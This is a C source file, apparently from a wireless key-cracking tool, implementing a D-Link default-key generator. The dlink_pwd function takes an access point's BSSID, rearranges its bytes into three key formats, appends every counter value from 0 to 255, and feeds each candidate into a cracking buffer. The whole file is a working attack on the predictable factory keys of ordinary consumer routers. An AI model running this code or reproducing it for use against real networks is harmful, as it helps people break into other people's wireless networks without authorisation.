/*********************************************************************************
 * Copyright (c) 2012, Chema Garcia                                              *
 * All rights reserved.                                                          *
 *                                                                               *
 * Redistribution and use in source and binary forms, with or                    *
 * without modification, are permitted provided that the following               *
 * conditions are met:                                                           *
 *                                                                               *
 *    * Redistributions of source code must retain the above                     *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer.                                                              *
 *                                                                               *
 *    * Redistributions in binary form must reproduce the above                  *
 *      copyright notice, this list of conditions and the following              *
 *      disclaimer in the documentation and/or other materials provided          *
 *      with the distribution.                                                   *
 *                                                                               *
 *    * Neither the name of the SafetyBits nor the names of its contributors may *
 *      be used to endorse or promote products derived from this software        *
 *      without specific prior written permission.                               *
 *                                                                               *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"   *
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE     *
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE    *
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE     *
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR           *
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF          *
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS      *
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN       *
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)       *
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE    *
 * POSSIBILITY OF SUCH DAMAGE.                                                   *
 *********************************************************************************/

#include <string.h>
#include <ctype.h>

#include "includes/main.h"
#include "includes/ciphers.h"
#include "includes/algorithms.h"

#include "algorithms/dlink.h"

void dlink_pwd ( struct crackdata *crack , unsigned int pattern )
{
    unsigned int            hbssid[6];
    unsigned int            lbssid[2];
    register unsigned int    s1 = 0, s2 = 0;
    register unsigned int    i, j;
    char                    passwd[33];
    unsigned char           *tmp;

    if ( pattern != DLINK_MODEL_GENERIC )
        return;

    memset ( hbssid , 0 , sizeof ( hbssid ) );
    memset ( lbssid , 0 , sizeof ( lbssid ) );

    sscanf ( crack->net->bssid, "%02x:%02x:%02x:%02x:%02x:%02x" , &hbssid[0], &hbssid[1], &hbssid[2], &hbssid[3], &hbssid[4], &hbssid[5] );
    lbssid[1] = hbssid[5] & 0x0F;
    lbssid[0] = hbssid[5] >> 0x04;

    if ( lbssid[1] > 0 )
    {
        s1 = lbssid[0];
        s2 = lbssid[1] - 1;
    }
    else if ( lbssid[0] > 0 )
    {
        s2 = 0x0F;
        s1 = lbssid[0] - 1;
    }

    for ( i = 0 ; i <= 0xFF && !crack->net->pwd.checked ; i++ )
    {
        /* primer formato */
        memset ( passwd , 0 , sizeof ( passwd ) );
        snprintf ( passwd , sizeof ( passwd ) , "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x" ,  hbssid[5] , hbssid[0] , hbssid[4] , hbssid[1] , hbssid[2] , hbssid[3] , hbssid[5] , hbssid[4] , hbssid[1] , hbssid[2] , hbssid[3] , hbssid[0] , i );

        for ( j = 0 ; j < 26 ; j++ )
            passwd[j] = toupper ( passwd[j] );

        tmp = (unsigned char*) strdup ( (char*) passwd );
        cbuffer_write(crack->buffer,(void*)tmp);

        /* segundo formato */
        memset ( passwd , 0 , sizeof ( passwd ) );
        snprintf ( passwd , sizeof ( passwd ) , "%01x%01x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x" , s1 , s2 , hbssid[0], hbssid[4] , hbssid[1] , hbssid[2] , hbssid[3] , hbssid[5] , hbssid[4] , hbssid[1] , hbssid[2] , hbssid[3] , hbssid[0] , i );

        for ( j = 0 ; j < 26 ; j++ )
            passwd[j] = toupper ( passwd[j] );

        tmp = (unsigned char*) strdup ( (char*) passwd );
        cbuffer_write(crack->buffer,(void*)tmp);

        /* tercer formato */
        memset ( passwd , 0 , sizeof ( passwd ) );
        snprintf ( passwd , sizeof ( passwd ) , "%01x%01x%02x%02x%02x%02x%02x%01x%01x%02x%02x%02x%02x%02x%02x" , s1 , s2 , hbssid[0], hbssid[4] , hbssid[1] , hbssid[2] , hbssid[3] , s1 , s2 , hbssid[4] , hbssid[1] , hbssid[2] , hbssid[3] , hbssid[0] , i );

        for ( j = 0 ; j < 26 ; j++ )
            passwd[j] = toupper ( passwd[j] );

        tmp = (unsigned char*) strdup ( (char*) passwd );
        cbuffer_write(crack->buffer,(void*)tmp);
    }

    return;
}
